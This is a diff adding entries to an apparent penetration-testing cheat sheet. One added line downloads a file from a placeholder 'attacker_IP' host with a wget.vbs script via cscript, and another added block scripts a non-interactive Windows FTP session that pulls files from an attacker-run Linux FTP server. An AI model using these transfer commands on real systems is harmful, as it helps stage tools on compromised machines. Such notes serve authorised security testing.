@@ -785,6 +785,9 @@ crunch min_length_here max_length_here -f /usr/share/crunch/charset.lst charset_
 ```powershell
 # run .vbs script
 cscript /path/to/vbs_script args_here
+
+# download file
+cscript wget.vbs http://attacker_IP/path/to/file outfile_here
 ```
 
 
@@ -1056,6 +1059,24 @@ rename old_file_name new_file_name
 
 # non-interactive ftp session, read commands from file (1 line = 1 command)
 ftp -v -n -s:file_here.txt
+
+# transfer file Win / ftp client -> Lin / ftp server
+# setup ftp server on Lin
+mkdir ftphome
+sudo systemctl start pure-ftpd
+sudo systemctl restart pure-ftpd # id service already running
+
+# prepare ftp commands on Win or interact with ftp prompt
+echo open IP_here 21 > ftp_commands.txt
+echo USER user_name_here >> ftp_commands.txt
+echo password_here >> ftp_commands.txt
+echo bin >> ftp_commands.txt
+echo GET filename_here >> ftp_commands.txt
+echo bye >> ftp_commands.txt
+
+# start session on Win
+ftp -v -n -s:ftp_commands.txt
+
 ```
 
 
